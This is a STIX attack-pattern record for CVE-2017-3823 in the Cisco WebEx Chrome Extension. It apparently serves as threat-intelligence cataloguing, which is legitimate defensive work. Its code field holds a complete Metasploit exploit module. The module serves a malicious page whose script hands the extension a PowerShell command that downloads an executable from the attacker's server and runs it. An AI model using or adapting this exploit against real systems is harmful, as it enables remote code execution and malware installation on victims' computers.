{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5d246c64-332e-45dc-b768-268de3a84971",
    "created": "2024-08-14T16:40:29.109083Z",
    "modified": "2024-08-14T16:40:29.109087Z",
    "name": "\"Cisco WebEx Chrome Extension RCE (CVE-2017-3823)\"",
    "description": " This module exploits a vulnerability present in the Cisco WebEx Chrome Extension version 1.0.1 which allows an attacker to execute arbitrary commands on a system.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/cisco_webex_ext.rb",
            "external_id": "cisco_webex_ext.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-3823"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::HttpServer\n  include Msf::Exploit::EXE\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"Cisco WebEx Chrome Extension RCE (CVE-2017-3823)\",\n      'Description'    => %q{\n        This module exploits a vulnerability present in the Cisco WebEx Chrome Extension\n        version 1.0.1 which allows an attacker to execute arbitrary commands on a system.\n        },\n        'License'        => MSF_LICENSE,\n        'Author'         =>\n        [\n          'Tavis Ormandy <taviso@google.com>',                # Original research/PoC\n          'William Webb <william_webb[at]rapid7.com>'         # Metasploit module\n        ],\n        'Platform'       => 'win',\n        'DefaultOptions' =>\n        {\n          'SSL' => true,\n        },\n        'Targets'        =>\n        [\n          [ 'Cisco WebEx Extension 1.0.1',\n            {\n              'Platform' => 'win',\n              'Arch'     => ARCH_X86,\n            }\n          ],\n        ],\n        'References'     =>\n        [\n          [ 'CVE', '2017-3823' ],\n        ],\n        'Arch'           => ARCH_X86,\n        'DisclosureDate' => '2017-01-21',\n        'DefaultTarget'  => 0\n        ))\nend\n\ndef setup\n  @payload_uri = \"#{Rex::Text.rand_text_alphanumeric(8)}\"\n  @payload_exe = \"#{Rex::Text.rand_text_alpha(8)}.exe\"\n  super\nend\n\ndef exploit_html(cli, req_uri)\n  base_uri = \"#{get_resource.chomp('/')}\"\n  html = %Q~\n<html>\n<head>\n<script>\nvar msg = {\n    GpcProductRoot: \"WebEx\",\n    GpcMovingInSubdir: \"Wanta\",\n    GpcProductVersion: \"T30_MC\",\n    GpcUnpackName: \"atgpcdec\",\n    GpcExtName: \"atgpcext\",\n    GpcUnpackVersion: \"27, 17, 2016, 501\",\n    GpcExtVersion: \"3015, 0, 2016, 1117\",\n    GpcUrlRoot: \"http://127.0.0.1/\",\n    GpcComponentName: btoa(\"MSVCR100.DLL\"),\n    GpcSuppressInstallation: btoa(\"True\"),\n    GpcFullPage: \"True\",\n    GpcInitCall: btoa(\"_wsystem(Ex1);\"),\n    Ex1: btoa(\"PowerShell [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true} ; $wc = New-Object System.Net.WebClient ; $pl = $env:temp+'\\\\#{@payload_exe}' ; $wc.DownloadFile('https://#{datastore['SRVHOST']}:#{datastore['SRVPORT']}#{base_uri}/#{@payload_uri}', $pl) ; Start-Process $pl\"),\n}\n\nfunction runcode()\n{\n    document.dispatchEvent(new CustomEvent(\"connect\", { detail: { token: \"token\" }}));\n    document.dispatchEvent(new CustomEvent(\"message\", { detail: {\n            message: JSON.stringify(msg),\n            message_type: \"launch_meeting\",\n            timestamp: (new Date()).toUTCString(),\n            token: \"token\"\n        }\n    }));\n}\n</script>\n</head>\n<body onload=\"runcode()\">\n\n</body>\n</html>\n  ~\n\n  send_response(cli, html, { 'Content-Type' => 'text/html', 'Pragma' => 'no-cache', 'Cache-Control' => 'no-cache', 'Connection' => 'close' })\nend\n\ndef on_request_uri(cli, request)\n  print_status(\"Got request: #{request.uri}\")\n  print_status(\"From: #{request.headers['User-Agent']}\")\n\n  if request.uri =~ /cwcsf-nativemsg-iframe-43c85c0d-d633-af5e-c056-32dc7efc570b\\.html/\n    print_status(\"Sending exploit html ...\")\n    exploit_html(cli, request.uri)\n    close_client(cli)\n    return\n  elsif request.uri =~ /.*#{@payload_uri}$/\n    return if ((payload = regenerate_payload(cli)) == nil)\n    print_status(\"Sending payload ...\")\n    send_response(cli, generate_payload_exe({ :code => payload.encoded }), { 'Content-Type' => 'application/octet-stream', 'Connection' => 'close' })\n  else\n    base_uri = \"#{get_resource.chomp('/')}\"\n    html = %Q~\n    <html>\n    <head>\n    <meta http-equiv=\"refresh\" content=\"0; URL='#{get_resource}/cwcsf-nativemsg-iframe-43c85c0d-d633-af5e-c056-32dc7efc570b.html' />\"\n    </head>\n    <body>\n    </body>\n    </html>\n    ~\n    send_response(cli, html, { 'Content-Type' => 'text/html', 'Pragma' => 'no-cache', 'Cache-Control' => 'no-cache', 'Connection' => 'close' })\n    close_client(cli)\n  end\n  end\nend\n",
    "x_mitre_disclosure_date": "2017-01-21",
    "x_mitre_platforms": [
        "win'"
    ]
}